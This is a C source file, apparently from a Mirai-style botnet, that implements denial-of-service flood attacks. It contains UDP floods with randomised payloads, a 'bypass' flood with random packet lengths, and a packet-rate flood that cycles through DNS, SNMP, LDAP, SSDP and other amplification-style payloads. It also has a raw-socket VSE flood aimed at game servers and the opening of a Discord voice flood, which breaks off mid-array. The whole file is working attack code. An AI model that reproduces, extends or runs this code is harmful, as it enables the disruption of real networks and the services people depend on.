#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <pthread.h>
#include <time.h>

#include <stdint.h>
#include <poll.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <stdbool.h>

#include "headers/includes.h"
#include "headers/attack.h"
#include "headers/checksum.h"
#include "headers/rand.h"
#include "headers/util.h"
#include "headers/table.h"
#include "headers/protocol.h"

#define MAX_SOCKETS 320
#define USERS_TO_SIMULATE 45
#define THREAD_COUNT 200
#define DEFAULT_PACKET_SIZE 1024

#define MAX(a,b) (((a) > (b)) ? (a) : (b))
#define IPV4(a,b,c,d) ((uint32_t)(((a)<<24)|((b)<<16)|((c)<<8)|(d)))

// ==================== VEGA HEX TABLE (256 LENGKAP) ====================
static char vega_hex[256][3] = {
    "\\x00","\\x01","\\x02","\\x03","\\x04","\\x05","\\x06","\\x07","\\x08","\\x09","\\x0a","\\x0b","\\x0c","\\x0d","\\x0e","\\x0f",
    "\\x10","\\x11","\\x12","\\x13","\\x14","\\x15","\\x16","\\x17","\\x18","\\x19","\\x1a","\\x1b","\\x1c","\\x1d","\\x1e","\\x1f",
    "\\x20","\\x21","\\x22","\\x23","\\x24","\\x25","\\x26","\\x27","\\x28","\\x29","\\x2a","\\x2b","\\x2c","\\x2d","\\x2e","\\x2f",
    "\\x30","\\x31","\\x32","\\x33","\\x34","\\x35","\\x36","\\x37","\\x38","\\x39","\\x3a","\\x3b","\\x3c","\\x3d","\\x3e","\\x3f",
    "\\x40","\\x41","\\x42","\\x43","\\x44","\\x45","\\x46","\\x47","\\x48","\\x49","\\x4a","\\x4b","\\x4c","\\x4d","\\x4e","\\x4f",
    "\\x50","\\x51","\\x52","\\x53","\\x54","\\x55","\\x56","\\x57","\\x58","\\x59","\\x5a","\\x5b","\\x5c","\\x5d","\\x5e","\\x5f",
    "\\x60","\\x61","\\x62","\\x63","\\x64","\\x65","\\x66","\\x67","\\x68","\\x69","\\x6a","\\x6b","\\x6c","\\x6d","\\x6e","\\x6f",
    "\\x70","\\x71","\\x72","\\x73","\\x74","\\x75","\\x76","\\x77","\\x78","\\x79","\\x7a","\\x7b","\\x7c","\\x7d","\\x7e","\\x7f",
    "\\x80","\\x81","\\x82","\\x83","\\x84","\\x85","\\x86","\\x87","\\x88","\\x89","\\x8a","\\x8b","\\x8c","\\x8d","\\x8e","\\x8f",
    "\\x90","\\x91","\\x92","\\x93","\\x94","\\x95","\\x96","\\x97","\\x98","\\x99","\\x9a","\\x9b","\\x9c","\\x9d","\\x9e","\\x9f",
    "\\xa0","\\xa1","\\xa2","\\xa3","\\xa4","\\xa5","\\xa6","\\xa7","\\xa8","\\xa9","\\xaa","\\xab","\\xac","\\xad","\\xae","\\xaf",
    "\\xb0","\\xb1","\\xb2","\\xb3","\\xb4","\\xb5","\\xb6","\\xb7","\\xb8","\\xb9","\\xba","\\xbb","\\xbc","\\xbd","\\xbe","\\xbf",
    "\\xc0","\\xc1","\\xc2","\\xc3","\\xc4","\\xc5","\\xc6","\\xc7","\\xc8","\\xc9","\\xca","\\xcb","\\xcc","\\xcd","\\xce","\\xcf",
    "\\xd0","\\xd1","\\xd2","\\xd3","\\xd4","\\xd5","\\xd6","\\xd7","\\xd8","\\xd9","\\xda","\\xdb","\\xdc","\\xdd","\\xde","\\xdf",
    "\\xe0","\\xe1","\\xe2","\\xe3","\\xe4","\\xe5","\\xe6","\\xe7","\\xe8","\\xe9","\\xea","\\xeb","\\xec","\\xed","\\xee","\\xef",
    "\\xf0","\\xf1","\\xf2","\\xf3","\\xf4","\\xf5","\\xf6","\\xf7","\\xf8","\\xf9","\\xfa","\\xfb","\\xfc","\\xfd","\\xfe","\\xff"
};

// Binary hex array (buat payload beneran)
static unsigned char binary_hex[256];
static int hex_initialized = 0;

// Precomputed random pool (8MB)
static unsigned char random_pool[8388608];
static int pool_initialized = 0;
static uint32_t pool_index = 0;

// Fast LCG random (super cepat)
static uint32_t fast_rand_state = 0x12345678;

static inline uint32_t fast_rand(void) {
    fast_rand_state = fast_rand_state * 1103515245 + 12345;
    return (fast_rand_state >> 16) & 0x7FFF;
}

static inline uint16_t fast_rand_port(void) {
    fast_rand_state = fast_rand_state * 1103515245 + 12345;
    return 1024 + (fast_rand_state % 64512);
}

static inline uint32_t fast_rand_next(void) {
    fast_rand_state = fast_rand_state * 1103515245 + 12345;
    return fast_rand_state;
}

static inline uint32_t fast_rand_range(uint32_t min, uint32_t max) {
    fast_rand_state = fast_rand_state * 1103515245 + 12345;
    return min + (fast_rand_state % (max - min + 1));
}

static inline unsigned char fast_rand_hex(void) {
    return binary_hex[fast_rand() % 256];
}

static inline void init_hex_table(void) {
    if (hex_initialized) return;
    for (int i = 0; i < 256; i++) {
        binary_hex[i] = (unsigned char)i;
    }
    hex_initialized = 1;
}

static inline void init_random_pool(void) {
    if (pool_initialized) return;
    for (int i = 0; i < sizeof(random_pool); i++) {
        random_pool[i] = fast_rand() & 0xFF;
    }
    pool_initialized = 1;
}

// Random string dari hex pool (ringan)
static inline void fast_rand_hex_str(unsigned char *buf, int len) {
    for (int i = 0; i < len; i++) {
        buf[i] = binary_hex[fast_rand() % 256];
    }
}

// Random string dari random pool (ringan)
static inline void fast_rand_str(unsigned char *buf, int len) {
    int offset = fast_rand() % (sizeof(random_pool) - len);
    memcpy(buf, random_pool + offset, len);
}

// Mixed hex + random pool (paling variatif)
static inline void fast_rand_mixed(unsigned char *buf, int len) {
    int use_hex = fast_rand() % 2;
    if (use_hex) {
        for (int i = 0; i < len; i++) {
            buf[i] = binary_hex[fast_rand() % 256];
        }
    } else {
        int offset = fast_rand() % (sizeof(random_pool) - len);
        memcpy(buf, random_pool + offset, len);
    }
}

// ==================== CACHE ====================
static char *vse_payload_cached = NULL;
static int vse_payload_len_cached = 0;
static ipv4_t dns_resolver_cached = 0;
static int dns_resolver_initialized = 0;

// ==================== UDP PLAIN (HEX + RANDOM + VEGA) ====================
void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    unsigned char **pkts = calloc(targs_len, sizeof(unsigned char *));
    int *fds = calloc(targs_len, sizeof(int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 256);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};

    init_random_pool();
    init_hex_table();

    if (sport == 0xffff) {
        sport = fast_rand_port();
    } else {
        sport = htons(sport);
    }

    for (i = 0; i < targs_len; i++) {
        pkts[i] = calloc(65535, sizeof(unsigned char));
        
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = fast_rand_port();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
            return;
        }
        
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));
        
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)fast_rand()) >> targs[i].netmask));
        
        connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        
        // Precompute payload awal dengan mixed hex
        if (data_rand) {
            fast_rand_mixed(pkts[i], data_len);
        } else {
            memset(pkts[i], 0x00, data_len);
        }
    }
    
    int loop_counter = 0;
    int random_rotate = 0;
    int hex_inject = 0;
    
    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            unsigned char *data = pkts[i];
            
            // REGENERATE PAYLOAD SETIAP 100 PAKET (variasi)
            if (data_rand && (++random_rotate % 100 == 0)) {
                fast_rand_mixed(data, data_len);
            }
            
            // INJECT RANDOM HEX DI TENGAH PAYLOAD (tiap 10-20 paket)
            if (data_rand && (++hex_inject % 15 == 0)) {
                int pos = fast_rand() % data_len;
                data[pos] = binary_hex[fast_rand() % 256];
            }
            
            send(fds[i], data, data_len, MSG_NOSIGNAL);
        }
        
        if (++loop_counter >= 500) {
            sched_yield();
            loop_counter = 0;
        }
    }
}

// ==================== STD (VEGA HEX STYLE LENGKAP) ====================
void attack_std(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    unsigned char **pkts = calloc(targs_len, sizeof(unsigned char *));
    int *fds = calloc(targs_len, sizeof(int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 256);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};

    init_hex_table();
    init_random_pool();

    if (sport == 0xffff) {
        sport = fast_rand_port();
    } else {
        sport = htons(sport);
    }

    for (i = 0; i < targs_len; i++) {
        pkts[i] = calloc(65535, sizeof(unsigned char));
        
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = fast_rand_port();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
            return;
        }
        
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));
        
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)fast_rand()) >> targs[i].netmask));
        
        connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        
        // VEGA HEX STYLE: setiap byte dari binary_hex
        if (data_rand) {
            for (int j = 0; j < data_len; j++) {
                pkts[i][j] = binary_hex[fast_rand() % 256];
            }
        } else {
            memset(pkts[i], 0x00, data_len);
        }
    }
    
    int loop_counter = 0;
    int vega_rotate = 0;
    
    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            unsigned char *data = pkts[i];
            
            // ROTASI VEGA HEX SETIAP PAKET (biar variasi maksimal)
            if (data_rand && (++vega_rotate % 50 == 0)) {
                for (int j = 0; j < data_len; j++) {
                    data[j] = binary_hex[fast_rand() % 256];
                }
            }
            
            send(fds[i], data, data_len, MSG_NOSIGNAL);
        }
        
        if (++loop_counter >= 450) {
            sched_yield();
            loop_counter = 0;
        }
    }
}

// ==================== UDP BYPASS (RANDOM LENGTH + HEX PAYLOAD) ====================
void attack_udpbypass(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    unsigned char **pkts = calloc(targs_len, sizeof(unsigned char *));
    int *fds = calloc(targs_len, sizeof(int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    struct sockaddr_in bind_addr = {0};

    init_random_pool();
    init_hex_table();

    if (sport == 0xffff) {
        sport = fast_rand_port();
    } else {
        sport = htons(sport);
    }

    for (i = 0; i < targs_len; i++) {
        pkts[i] = calloc(65535, sizeof(unsigned char));
        
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = fast_rand_port();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
            return;
        }
        
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));
        
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)fast_rand()) >> targs[i].netmask));
        
        connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
    }
    
    int loop_counter = 0;
    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            unsigned char *data = pkts[i];
            // RANDOM LENGTH 300-1400
            uint16_t data_len = fast_rand_range(300, 1400);
            // RANDOM HEX PAYLOAD
            fast_rand_hex_str(data, data_len);
            send(fds[i], data, data_len, MSG_NOSIGNAL);
        }
        
        if (++loop_counter >= 400) {
            sched_yield();
            loop_counter = 0;
        }
    }
}

// ==================== UDPPPS (PATTERNED + HEX VARIATION) ====================
void attack_udppps(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    char* strings[] = {
        "\x0D\x0A\x0D\x0A",
        "\x01\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01",
        "\x01\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01",
        "\x72\xFE\x1D\x13\x00\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xA0\x00\x01\x97\x7C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        "\xd9\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x00\x0a\xfa\x00\x00\x00\x00\x00\x01\x02\x90\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc5\x02\x04\xec\xec\x42\xee\x92",
        "\x01\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01",
        "\x30\x3A\x02\x01\x03\x30\x0F\x02\x02\x4A\x69\x02\x03\x00\xFF\xE3\x04\x01\x04\x02\x01\x03\x04\x10\x30\x0E\x04\x00\x02\x01\x00\x02\x01\x00\x04\x00\x04\x00\x04\x00\x30\x12\x04\x00\x04\x00\xA0\x0C\x02\x02\x37\xF0\x02\x01\x00\x02\x01\x00\x30\x00",
        "\x00\x01\x00\x02\x00\x01\x00",
        "\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00",
        "\x02\x01\x00\x006 \x00\x00\x00\x00\x00\x01\x00\x02en\x00\x00\x00\x15service:service-agent\x00\x07 default\x00\x00\x00\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99",
        "\x00\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x11\x22\x33\x44\x55\x66\x77\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\xA4\x00\x00\x00\x01\x00\x00\x00\x01\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x00\x00\x00\x98\x01\x01\x00\x04\x03\x00\x00\x24\x01\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x02\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x01\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x03\x01\x00\x00\x80\x01\x00\x01\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01",
        "\x01\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x88\x99\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x11\x22\x33\x44\x55\x66\x77\x00\x11\x22\x33\x44\x55\x66\x77\x00\x11\x22\x33\x44\x55\x66\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x77\x00\x11\x22\x33\x44\x55\x66\x77\x00\x11\x22\x33\x44\x55\x66\x77\x00\x11\x22\x33\x44\x55\x66\x77\x00\x11\x22\x33\x44\x55\x66\x77\x00\x11\x22\x33\x44\x55\x66\x77\x00\x11\x22\x33\x44\x55\x66\x77",
        "\x06\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x00\xff\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x20\x18\xc8\x81\x00\x38\x8e\x04\xb5\x00\x11\x22\x33\x44\x55\x66\x77\x00\x11\x22\x33\x44\x55\x66\x77\x00\x11\x22\x33\x44\x55\x66\x77\x00\x11\x22\x33\x44\x55\x66\x77\x00\x11\x22\x33\x44\x55\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x66\x77\x00\x11\x22\x33\x44\x55\x66\x77\x00\x11\x22\x33\x44\x55\x66\x77\x00\x11\x22\x33\x44\x55\x66\x77",
        "SNQUERY: 127.0.0.1:AAAAAA:xsvr",
        "8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\0",
        "\x02",
        "\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x99\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a",
        "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0C\x00\x01",
        "\xf4\xbe\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x002x\xba\x85\tTeamSpeak\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\nWindows XP\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00 \x00<\x00\x00\x01\x00\x00\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08nickname\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44\x83\xc8\x8d\x51\x45\x6f\x90\x95\x23\x3e\x00\x97\x2b\x1c\x71\xb2\x4e\xc0\x61\xf1\xd7\x6f\xc5\x7e\xf6\x48\x52\xbf\x82\x6a\xa2\x3b\x65\xaa\x18\x7a\x17\x38\xc3\x81\x27\xc3\x47\xfc\xa7\x35\xba\xfc\x0f\x9d\x9d\x72\x24\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x9d\xfc\x02\x17\x6d\x6b\xb1\x2d\x72\xc6\xe3\x17\x1c\x95\xd9\x69\x99\x57\xce\xdd\xdf\x05\xdc\x03\x94\x56\x04\x3a\x14\xe5\xad\x9a\x2b\x14\x30\x3a\x23\xa3\x25\xad\xe8\xe6\x39\x8a\x85\x2a\xc6\xdf\xe5\x5d\x2d\xa0\x2f\x5d\x9c\xd7\x2b\x24\xfb\xb0\x9c\xc2\xba\x89\xb4\x1b\x17\xa2\xb6",
    };
    
    int i;
    unsigned char **pkts = calloc(targs_len, sizeof(unsigned char *));
    int *fds = calloc(targs_len, sizeof(int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    struct sockaddr_in bind_addr = {0};

    init_random_pool();
    init_hex_table();

    if (sport == 0xffff) {
        sport = fast_rand_port();
    } else {
        sport = htons(sport);
    }

    for (i = 0; i < targs_len; i++) {
        pkts[i] = calloc(65535, sizeof(unsigned char));
        
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = fast_rand_port();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
            return;
        }
        
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));
        
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)fast_rand()) >> targs[i].netmask));
        
        connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
    }
    
    int loop_counter = 0;
    int string_count = sizeof(strings) / sizeof(strings[0]);
    
    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            int idx = fast_rand() % string_count;
            send(fds[i], strings[idx], strlen(strings[idx]) + 1, MSG_NOSIGNAL);
        }
        
        if (++loop_counter >= 500) {
            sched_yield();
            loop_counter = 0;
        }
    }
}

// ==================== VSE (TETAP SAMA) ====================
void attack_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 27015);
    
    if (vse_payload_cached == NULL) {
        table_unlock_val(TABLE_ATK_VSE);
        vse_payload_cached = table_retrieve_val(TABLE_ATK_VSE, &vse_payload_len_cached);
    }

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1) {
        return;
    }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    if (sport == 0xffff)
        sport = fast_rand_port();
    else
        sport = htons(sport);

    for (i = 0; i < targs_len; i++) {
        pkts[i] = calloc(512, sizeof(char));
        struct iphdr *iph = (struct iphdr *)pkts[i];
        struct udphdr *udph = (struct udphdr *)(iph + 1);
        char *data = (char *)(udph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len_cached);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag) iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = targs[i].addr;

        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len_cached);

        *((uint32_t *)data) = 0xffffffff;
        data += sizeof(uint32_t);
        util_memcpy(data, vse_payload_cached, vse_payload_len_cached);

        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
        udph->check = 0;
        udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len_cached);
    }

    int loop_counter = 0;
    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            struct udphdr *udph = (struct udphdr *)(iph + 1);

            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (fast_rand() % (1 << (32 - targs[i].netmask))));

            if (ip_ident == 0xffff)
                iph->id = htons(fast_rand() % 65535);
            if (sport == 0xffff)
                udph->source = htons(fast_rand_port());
            if (dport == 0xffff)
                udph->dest = htons(fast_rand_port());

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len_cached);

            sendto(fd, pkts[i], ntohs(iph->tot_len), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
        
        if (++loop_counter >= 500) {
            sched_yield();
            loop_counter = 0;
        }
    }
}

// ==================== DISCORD (DENGAN HEX VARIATION) ====================
void attack_discord(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts) {
    int socks[MAX_SOCKETS];
    int active_sockets = 0;
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 50001);
    int length = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);
    
    init_random_pool();
    init_hex_table();
    
    for (int i = 0; i < MAX_SOCKETS; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (socks[i] < 0) continue;
        active_sockets++;
        
        int buf_size = 524288;
        setsockopt(socks[i], SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
        setsockopt(socks[i], SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));
        int tos_value = (i % 2 == 0) ? 0xb8 : 0x88;
        setsockopt(socks[i], IPPROTO_IP, IP_TOS, &tos_value, sizeof(int));
        fcntl(socks[i], F_SETFL, O_NONBLOCK);
        
        struct sockaddr_in src;
        src.sin_family = AF_INET;
        src.sin_port = htons(1024 + (fast_rand() % 64000));
        src.sin_addr.s_addr = INADDR_ANY;
        bind(socks[i], (struct sockaddr *)&src, sizeof(src));
    }
    
    uint8_t discord_opus_pattern[8][16] = {
